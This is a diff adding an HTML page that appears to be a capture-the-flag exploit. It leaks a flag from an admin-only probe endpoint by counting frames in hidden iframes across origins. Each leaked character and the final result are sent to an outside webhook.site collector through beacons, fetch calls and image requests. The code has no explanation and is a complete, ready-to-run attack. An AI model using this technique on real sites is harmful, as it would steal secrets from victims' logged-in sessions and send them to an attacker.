@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>x</title></head>
+<body><pre id="log">boot</pre>
+<script>
+const hook = "https://webhook.site/77e2a612-4b4a-4c17-8c68-7f479d4b14d5";
+const base = "https://chall.com/admin/probe?data=";
+function ping(q){
+  try{ navigator.sendBeacon(hook+"?"+q); }catch(e){}
+  fetch(hook+"?"+q,{mode:"no-cors",cache:"no-store"}).catch(()=>{});
+  (new Image()).src = hook+"?"+q+"&i=1&t="+Date.now();
+}
+ping("evt=visit&t="+Date.now());
+function makeData(index, byte){
+  const inp = new Uint8Array(21);
+  inp[16] = index & 255;
+  inp[20] = byte & 255;
+  let s="";
+  for (const b of inp) s += b.toString(16).padStart(2,"0");
+  return s;
+}
+function checkOne(index, byte){
+  return new Promise((resolve)=>{
+    const ifr = document.createElement("iframe");
+    ifr.style.cssText="position:absolute;width:1px;height:1px;left:-10px";
+    let done=false;
+    const finish=(len)=>{ if(done) return; done=true; try{ifr.remove()}catch(e){} resolve(len); };
+    ifr.onload=()=>{
+      setTimeout(()=>{
+        let len=-1;
+        try{ len = ifr.contentWindow.length; }catch(e){ len=-2; }
+        finish(len);
+      }, 700);
+    };
+    ifr.src = base + makeData(index, byte);
+    document.body.appendChild(ifr);
+    setTimeout(()=>finish(-3), 3500);
+  });
+}
+async function checkBatch(index, bytes){
+  const lens = await Promise.all(bytes.map(b=>checkOne(index,b)));
+  const hit=[];
+  for(let i=0;i<bytes.length;i++) if(lens[i]===1) hit.push(bytes[i]);
+  return hit;
+}
+const alphabet=[];
+for (const c of "DH{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") alphabet.push(c.charCodeAt(0));
+for (let b=32;b<=126;b++) if(!alphabet.includes(b)) alphabet.push(b);
+async function leakByte(index){
+  for(let i=0;i<alphabet.length;i+=6){
+    const batch=alphabet.slice(i,i+6);
+    const hit=await checkBatch(index, batch);
+    if(hit.length) return hit[0];
+  }
+  return -1;
+}
+(async()=>{
+  const d=await checkOne(0,0x44);
+  const x=await checkOne(0,0x58);
+  ping("evt=probe&d="+d+"&x="+x);
+  const flag=[];
+  for(let i=0;i<64;i++){
+    const b=await leakByte(i);
+    flag.push(b);
+    const sofar=flag.map(c=>(c>31&&c<127)?String.fromCharCode(c):"").join("");
+    ping("evt=p&i="+i+"&b="+b+"&s="+encodeURIComponent(sofar));
+    if(b<0) break;
+    if(b===125 && sofar.startsWith("DH{")) break;
+  }
+  const final=flag.filter(c=>c>31&&c<127).map(c=>String.fromCharCode(c)).join("");
+  ping("evt=final&s="+encodeURIComponent(final));
+})().catch(e=>ping("evt=err&m="+encodeURIComponent(String(e))));
+</script></body></html>
